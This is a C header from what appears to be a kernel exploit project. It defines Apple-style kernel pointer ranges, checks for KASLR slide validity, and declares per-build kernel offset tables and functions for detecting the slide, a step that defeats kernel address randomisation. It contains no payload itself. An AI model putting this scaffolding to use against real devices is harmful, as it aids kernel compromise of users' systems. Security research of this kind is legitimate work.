#pragma once
#include <stdint.h>
#include <string.h>
#include "exploit.h"

#define KASLR_KPTR_LO  0xFFFFFFF000000000ULL
#define KASLR_KPTR_HI  0xFFFFFFF100000000ULL

static inline int slide_valid(uint64_t s) {
    return s > 0 && s < MAX_SLIDE && (s & (NK_PAGE_SZ - 1)) == 0;
}
static inline int is_kptr(uint64_t v) {
    return v >= KASLR_KPTR_LO && v < KASLR_KPTR_HI;
}

typedef struct {
    const char *build;
    uint64_t    text;        /* image base pre-slide */
    uint64_t    text_exec;
    uint64_t    data_const;
    uint64_t    data_sptm;
    uint64_t    data;
} nk_koffs_t;

extern const nk_koffs_t *g_koffs;

int      nk_koffs_resolve(void);
uint64_t nk_kaslr_detect(void);
int      nk_detect_slide(void);
int      nk_kaslr_candidate_count(void);
uint64_t nk_kaslr_candidate(int i);
